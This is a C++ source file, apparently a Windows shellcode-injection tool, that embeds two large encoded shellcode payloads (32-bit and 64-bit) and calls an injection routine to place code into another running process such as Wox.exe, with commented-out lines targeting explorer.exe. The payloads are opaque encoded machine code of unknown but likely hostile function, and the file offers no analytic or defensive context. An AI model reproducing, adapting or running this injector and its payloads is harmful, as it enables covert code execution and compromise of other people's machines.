// ShellCodeInject.cpp : 定义控制台应用程序的入口点。
//

#include <Windows.h>  
#include <inject\ShellCodeInject.h>

#ifndef _WIN64
unsigned char buf[] =
"\xba\xa4\x52\x95\x5d\xdb\xc8\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x67\x31\x57\x12\x03\x57\x12\x83\x4b\xae\x77\xa8\x48\x89\xc2"
"\xd4\x88\xd1\x5a\x02\x20\xfa\x68\xea\xf9\xcb\x20\x73\xc8\x9d"
"\x5a\x77\x7c\x3a\xd8\xb1\x03\x3e\xec\xec\xa2\x45\x82\xa0\xc8"
"\x0d\x96\x65\xba\xd3\x4e\x96\xc1\xa7\x0e\x7a\x88\x53\xbe\xe9"
"\xa3\x54\xc9\x1b\xda\x2b\x13\x50\x4b\xdc\xba\x91\x3a\x25\x7d"
"\x20\x07\xf5\xdb\x11\x2a\x45\x4a\xeb\xe0\x46\xbe\xb8\xa5\xea"
"\x39\x2d\xf5\xfd\x7c\xe7\x1e\x04\x9e\x67\xd8\x21\x7b\x60\xba"
"\x31\xa5\xcc\x20\xf9\x9e\x23\x41\xb7\x96\x20\x05\xbd\xc7\xb5"
"\xf3\x8e\xae\x5f\x26\xbd\x5f\xd0\xcb\xa8\xba\x21\xf7\xef\x49"
"\x93\xd0\xf4\x30\x69\xcb\xa9\x91\x87\x01\xe5\xa8\x1e\xff\xd6"
"\xd7\x31\x1d\xda\xa4\xd5\x7e\xf6\x86\x1b\x86\x0f\x40\x9d\x14"
"\x0b\x5a\x11\x05\x19\x3f\x9c\x60\xed\x77\x14\x54\xfa\x39\xcd"
"\x48\xfb\xc1\xeb\xba\x4f\x1b\xaf\xc9\xef\x92\xd2\x7a\xde\x68"
"\x64\x8a\xe4\x1d\xf9\x6c\xdf\x1d\x3e\x4d\xc2\x8a\xed\x67\xd0"
"\xc3\xed\xcf\x29\x18\x8a\x12\x25\xc8\xf9\x85\x79\x93\x60\x12"
"\xf9\x3a\x37\xf9\xf2\x9f\x11\x42\xad\x08\xe5\x28\x89\xae\x34"
"\x1d\xfa\x9c\xef\x5b\xb7\x9f\x9c\x75\x05\xbb\xb8\x8f\x8b\x14"
"\x14\xd9\x10\x01\xa6\x99\x5b\x3e\x2a\x94\x72\x05\xf4\x7a\xa7"
"\x55\x78\x8c\x1c\x7f\x96\x13\x0a\x95\x50\x0d\x06\x7e\xa0\x7c"
"\x61\x6a\x62\xff\x43\x79\x5c\xc2\x68\xf4\x9a\x6f\x54\x85\x1a"
"\x73\x0e\x63\x9b\x3b\x1f\x49\x2b\xcd\x4c\x10\x46\x17\x8f\xc4"
"\x01\xa5\x9f\xa4\x6e\xed\x85\x29\xa9\x8f\xaf\x3c\x83\x4a\x8e"
"\x02\x61\x6a\x5c\x5a\xf0\xad\x5f\xd7\xee\x4e\xac\x51\x24\x89"
"\x2a\x0c\x32\xe2\x68\x89\xb1\x49\xb7\xe2\x61\x0e\x39\xa7\x95"
"\x3e\xe4\x54\x2c\xd4\x5a\x46\x1a\x0b\xdd\x7b\x29\x17\x38\x18"
"\x54\xae\x16\x12\x20\xb1\x13\xd3\x7a\xb3\xd1\x4b\x8f\x9f\x58"
"\x02\xc4\x27\xd2\xda\xab\x8a\xf4\xfa\x3d\xe1\xbf\x6d\x39\xd4"
"\xa6\xf5\x25\xb2\x98\xe0\xec\xfe\x86\xdb\x65\x32\xbc\x68\xc9";
#else
unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xb6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x1c\x8b\x9e\xee\xf0\x10\x58\x79\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x54\xba\x57\xa6\x71\xf9"
"\xe3\x86\xe3\x74\xd6\x63\xf5\xff\xa7\x86\xe3\xc3\x25\x14\x83"
"\xc7\xda\x8a\xd8\x27\xc7\xa6\xc1\x48\x7f\x31\x31\x73\x61\x11"
"\x0f\xf2\xac\xcb\x5e\x95\x54\x9c\xdd\x7c\xfe\x7c\x90\x14\x91"
"\x18\xdb\x43\xfe\x7c\x27\xe7\x9a\x13\xea\x55\xec\xb6\xd4\x49"
"\x54\x2c\x6c\x9b\x49\xae\x97\xa3\xe3\xe2\xd6\x48\x7b\xc5\x32"
"\x51\x01\xc0\x43\xa9\x87\x8d\xf0\xe4\xb0\x78\xdd\xf8\xd1\xc5"
"\x80\x67\x94\x60\x04\xfb\xe7\xc5\x3a\xe7\xe9\x60\x04\xfb\xa7"
"\xc5\x3a\xc7\xa1\x60\x80\x1e\xcd\xc7\xfc\x84\x38\x60\xbe\x69"
"\x2b\xb1\xd0\xc9\xf3\x04\xaf\xe8\x46\x44\xbc\xf4\xf0\xe9\x6d"
"\x44\xd5\xcc\xe0\xfd\x7a\x7a\xaf\x22\xc5\xb1\xf9\xb4\x21\x4e"
"\x0e\xd1\x9f\x86\xb3\xba\x74\x5a\x8f\xa9\x87\x06\x31\x3d\xf1"
"\x28\x8f\xe1\x02\x4d\xc5\xd2\xb9\x29\x5f\xf9\x0c\xc5\xa9\xf1"
"\x7a\x68\xaf\xe0\x86\x5d\x52\xe3\xb9\xd7\x46\xe8\x0c\xb9\x39"
"\xfd\xf0\xfe\xc2\x98\x4e\xc5\x80\x75\x5d\x69\x4e\x60\x8a\xcc"
"\xb0\x74\xc9\xc8\xfa\x58\xcb\x8e\xfd\x91\xf9\x6d\xb6\x78\xf2"
"\x55\xe9\xf1\x7a\x68\xab\xe0\x86\x5d\xd7\xf4\x7a\x24\xc7\xed"
"\x0c\xcd\xad\xfc\xf0\xf8\xce\x22\x83\x05\xf9\xb4\x21\x69\xd7"
"\xe8\xdf\xd3\xe8\xef\xb0\x70\xce\xf0\xc6\xd7\xf9\x36\x1d\x08"
"\xce\xfb\x78\x6d\xe9\xf4\xa8\x72\xc7\x22\x95\x64\xfa\x4a\x0e"
"\xd7\xd2\xe0\x39\xfa\xc2\x87\xae\x1b\xbd\xa9\x87\xcc\xe7\xfc"
"\x78\xce\xc7\x28\x6b\x2d\xb0\xb5\xf1\x61\x06\x4c\xce\x31\xb3"
"\xb5\xee\xb1\x4f\x01\x86\xe2\xf0\xe1\xb8\xa1\x6b\xe5\x0e\x7c"
"\xf0\x0f\xbd\x5f\xa9\xae\x78\x58\xfd\x3c\x1b\x40\x8e\xa8\x87"
"\x8d\xe8\xf4\x4b\x01\x0f\xc2\x87\x72\x64\xdf\xf4\x69\xd1\xf9"
"\xd7\xc0\x80\x7c\xbc\x19\x4f\xe1\x78\x4d\xf9\x3c\x33\x60\x70"
"\x69\xcf\x04\x70\xf4\x4b\xc2\x80\x76\x67\x72\x64\xfd\x78\xef"
"\xe5\xb9\xc6\xd5\xfd\x3c\x13\x60\x06\x50\xc6\x37\x28\x10\x85"
"\x49\x70\x7c\x02\x4d\xc5\xbf\xb8\xd7\x41\xdc\x62\x65\x22\xb5"
"\xf1\x28\xc7\x2a\x6b\x9d\xf9\x3c\x13\x65\xbe\x60\xed\x89\xf0"
"\xed\xb9\xa1\x76\xe8\x3d\x8f\x68\x7d\xae\xd7\x5a\x2a\x7f\x8d"
"\xcf\xe0\xb9\xab\x4b\x89\xd9\x04\x47\xdf\xb1\x69\xd6\xc1\x87"
"\x9d\xb1\xb5\xb0\x70\xc7\x20\x75\xc5\x80\x7c\xb0\x92\xd7\x0d"
"\xd4\x68\x4e\x60\xb9\xa1\x4c\xe0\x0e\x4a\xfc\x84\x38\x61\x06"
"\x59\xcf\x04\x6b\xfd\x78\xd1\xce\x13\x85\x54\x79\xea\x0e\xfd"
"\x0c\x51\x87\xf0\x99\xed\xb0\x7f\xd6\xc1\x87\xcd\xb1\xb5\xb0"
"\x70\xe5\xa9\xdd\xcc\x0b\xbe\xde\x27\xbf\x56\x52\xda\xe8\xf4"
"\x4b\x5d\xe1\xe4\xe6\x72\x64\xfc\x0e\xe6\x66\x95\x78\x72\x4e"
"\xfd\xf0\xeb\xc7\x80\x41\xc5\x34\x43\x84\x9c\xce\x56\x60\xd5"
"\xdb\xb5\xa8\x93\x6f\xb4\xad\x87\xf0\x3c\x2b\xd7\x5a\xa9\x01"
"\x79";
#endif

void Inject(void)
{
    return;
}

int main(int argc, char* argv[])
{
    //inject::ShellCodeInject(buf, sizeof(buf));
    //inject::ShellCodeInject(L"explorer.exe", buf, sizeof(buf));
    inject::ShellCodeInject(L"Wox.exe", (unsigned char *)Inject, 4096);
    return 0;
}
